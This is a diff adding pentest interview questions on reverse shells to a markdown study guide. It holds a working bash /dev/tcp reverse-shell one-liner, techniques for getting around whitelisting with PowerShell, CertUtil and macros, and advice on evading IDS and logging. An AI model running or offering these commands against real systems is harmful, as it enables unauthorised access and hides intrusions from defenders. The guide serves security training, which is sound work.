@@ -47,9 +47,21 @@
 - `Encrypting your reverse shell traffic` prevents the IDS from inspecting and understanding the payload.
 - `Use HTTPS/TLS` as it makes your traffic appear as legitimate web traffic, often bypassing IDS rules that focus on typical shell connections.
 
-## 8. 
+## 8. Consider a scenario where the target environment restricts the execution of common reverse shell binaries (e.g., netcat). How would you `achieve a reverse shell without using traditional tools?`
+- Using Bash: `Use the Bash built-in /dev/tcp to create a reverse shell` eg. `bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'`
+- Or using `perl, python, powershell, php etc`
+
+## 9. You need to set up a reverse shell on a Windows machine that has a strict application whitelist policy. How would you go about `bypassing this restriction to establish your shell?`
+- `Use the allowed applications and built-in system utilities eg. PowerShell, Windows Script Host (wscript/cscript), and Microsoft Office Macros (VBA macros), CertUtil (Certificate mgmt utility) to download a script or binary from a remote server.
+
+## 10. During a penetration test, you encounter a target system that logs all incoming and outgoing network connections. How would you set up a reverse shell `to minimize your footprint and avoid leaving logs?`
+- `Existing Whitelisted Services` (making your reverse shell traffic blend in with legitimate traffic.)
+- `HTTPS Reverse Shell`: Use HTTPS to encrypt and obfuscate the reverse shell traffic, making it appear as regular web browsing activity.
 
 
-
-
-
+## 11. Imagine a scenario where the `target system is running a web server with a known vulnerability`. Describe `how you would exploit this vulnerability` to establish either a bind or reverse shell, depending on the network constraints.
+- Identify the Vulnerability (Nmap, Nessus, OpenVAS, or specific exploit databases like Exploit-DB, Metasploit)
+- Craft the Exploit (using msfvenom)
+- Deliver/Execute the Exploit (Using tools like curl, wget, or a custom Python script to send the malicious request to the web server.)
+- Establish the Shell (Listen on Attacker's VM: nc -lvnp attacker_port)
+- - When the HTTP request is executed, the reverse shell will connect back to the attacker machine, providing a shell.
